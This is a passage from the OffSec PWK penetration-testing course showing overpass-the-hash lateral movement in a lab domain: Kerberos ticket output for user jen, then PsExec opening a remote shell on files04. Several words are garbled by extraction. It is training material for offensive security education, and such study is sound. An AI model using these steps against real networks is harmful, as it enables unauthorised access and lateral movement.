# OffSec

```
Client: jen @CORP.COM
Server: cifs04 @CORP.COM
Kerbdicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
Ticket Flags 0x40a1000 -> forwardable renewable pre_auth name_canonical
Start Time: 2/27/2023 15:27:28 (local)
End Time: 2/27/2023 15:27:28 (local)
Renew Time: 3/6/2023 5:27:28 (local)
Session Key Type: AES-256-CTS-HMAC-SHA1-96
Cache Flags: 0
Kdc Called: DC1.corp.com
Listing 844 - Mapping a network share on a remote server and listing Kerberos tickets
```

The output indicates that the net command was successful. We then used list to the newly requested Kerberos tickets, including a TGT and a TGS for the Common Internet System (CIFS) service.

> We did not use arbitrarily in this example, but we could have used any command that requires domain permissions and would subsequently create a TGS.

We have now connected the NTLM hash into Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) as the official PsExec application from Microsoft.¹¹⁵⁹

PsExec can run a command but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of jen in the PowerShell session, we reuse the TGT to obtain code execution on the files04 host.

Let's try now, running \PsExec.exe to launch cmd remotely on the \files04 machine as jen.

```
PS C:\Windows\system32> cd \tools\SysinternalsSuite\
PS C:\Windows\SysinternalsSuite> .PsExec.exe \files04 cmd
```

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

```
C:\Windows\system32>whoami
corp\jen
```

```
C:\Windows\system32>hostname
FILES04
```

Listing 845- Opening remote connection using Kerberos

¹¹⁵⁹ (Microsoft, 2016), https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

PWK - © 2023 OffSec Services Limited. All rights reserved.